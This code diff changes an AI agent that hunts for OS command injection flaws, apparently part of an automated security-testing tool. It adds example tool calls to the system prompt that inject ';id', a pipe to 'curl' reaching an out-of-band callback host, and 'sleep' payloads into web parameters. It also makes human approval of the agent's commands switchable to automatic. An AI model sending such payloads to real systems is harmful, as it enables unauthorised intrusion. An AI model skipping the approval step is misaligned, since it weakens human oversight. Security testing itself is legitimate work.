@@ -25,6 +25,7 @@ import type {
   ReactFinding,
 } from '../core/engine/react_loop';
 import { AGENT_TOOL_SCHEMAS } from '../core/engine/tool_schemas';
+import type { HttpClient } from '../core/http/request_engine';
 
 const COMMAND_INJECTION_SYSTEM_PROMPT = `You are an expert OS command injection security researcher with deep knowledge of shell interpreters (bash, sh, cmd.exe, PowerShell), command chaining operators, input sanitization bypasses, and blind detection techniques. You specialize in finding command injection vulnerabilities in web applications and APIs that pass user input to system commands.
 
@@ -107,7 +108,37 @@ IMPORTANT RULES:
 - Use appropriate delays between requests to avoid overwhelming targets
 - Never attempt to establish persistence, create backdoors, or pivot to other systems
 - Document every finding with the exact payload, injection point, and command output
-- Report the OS, injection method, and any WAF bypasses required`;
+- Report the OS, injection method, and any WAF bypasses required
+
+## Examples of Successful Command Injection Discoveries
+
+### Example 1: OS Command Injection in Image Processing Endpoint
+**Step 1 — Identify injectable parameter:**
+Tool call: http_request { url: "https://[redacted].com/api/image/resize?url=https://example.com/img.png&width=100", method: "GET" }
+Response: 200 OK — returns resized image (server-side processing)
+
+**Step 2 — Test command separator:**
+Tool call: http_request { url: "https://[redacted].com/api/image/resize?url=https://example.com/img.png%3Bid&width=100", method: "GET" }
+Response: 500 — error message includes "uid=33(www-data)" — command injection via semicolon!
+
+**Step 3 — Confirm with OOB callback:**
+Tool call: http_request { url: "https://[redacted].com/api/image/resize?url=https://example.com/img.png%7Ccurl+UNIQUE.oast.fun&width=100", method: "GET" }
+Response: 200 OK — received HTTP callback at oast.fun from target IP — blind injection confirmed
+
+**Step 4 — Report:**
+Tool call: report_finding { title: "OS Command Injection in /api/image/resize 'url' parameter — www-data user, pipe and semicolon separators work", severity: "critical", vulnerability_type: "command_injection", confidence: 98 }
+
+### Example 2: Blind Time-Based Injection in Filename Parameter
+**Step 1 — Test with sleep payload:**
+Tool call: http_request { url: "https://[redacted].com/api/convert", method: "POST", body: "{\\"filename\\":\\"test.pdf;sleep 5;\\"}" }
+Response: 200 OK after 5.2 seconds (normally responds in 200ms) — time-based blind injection
+
+**Step 2 — Validate with different delay:**
+Tool call: http_request { url: "https://[redacted].com/api/convert", method: "POST", body: "{\\"filename\\":\\"test.pdf;sleep 10;\\"}" }
+Response: 200 OK after 10.1 seconds — delay correlates precisely
+
+**Step 3 — Report:**
+Tool call: report_finding { title: "Blind OS Command Injection in /api/convert 'filename' parameter — time-based confirmed", severity: "critical", vulnerability_type: "command_injection_blind", confidence: 92 }`;
 
 export class CommandInjectionHunterAgent implements BaseAgent {
   readonly metadata: AgentMetadata = {
@@ -123,6 +154,7 @@ export class CommandInjectionHunterAgent implements BaseAgent {
   private model?: string;
   private findings: AgentFinding[] = [];
   private status: AgentStatus;
+  private autoApproveSafe = false;
   private onApprovalRequest?: (req: { command: string; target: string; reasoning: string; category: string; toolName: string; safetyWarnings: string[] }) => Promise<boolean>;
   private onExecuteCommand?: (command: string, target: string) => Promise<CommandResult>;
 
@@ -141,9 +173,13 @@ export class CommandInjectionHunterAgent implements BaseAgent {
   setCallbacks(callbacks: {
     onApprovalRequest?: (req: { command: string; target: string; reasoning: string; category: string; toolName: string; safetyWarnings: string[] }) => Promise<boolean>;
     onExecuteCommand?: (command: string, target: string) => Promise<CommandResult>;
+    autoApproveSafe?: boolean;
   }): void {
     this.onApprovalRequest = callbacks.onApprovalRequest;
     this.onExecuteCommand = callbacks.onExecuteCommand;
+    if (callbacks.autoApproveSafe !== undefined) {
+      this.autoApproveSafe = callbacks.autoApproveSafe;
+    }
   }
 
   async initialize(provider: ModelProvider, model: string): Promise<void> {
@@ -172,7 +208,7 @@ export class CommandInjectionHunterAgent implements BaseAgent {
         maxIterations: 30,
         target: task.target,
         scope: task.scope,
-        autoApproveSafe: false,
+        autoApproveSafe: this.autoApproveSafe,
         onApprovalRequest: this.onApprovalRequest,
         onExecuteCommand: this.onExecuteCommand,
         onFinding: (finding) => {
@@ -183,6 +219,8 @@ export class CommandInjectionHunterAgent implements BaseAgent {
           this.status.toolsExecuted = update.toolCallCount;
           this.status.lastUpdate = Date.now();
         },
+        httpClient: task.parameters.httpClient as HttpClient | undefined,
+        availableTools: task.parameters.availableTools as string[] | undefined,
       });
 
       const result = await loop.execute();
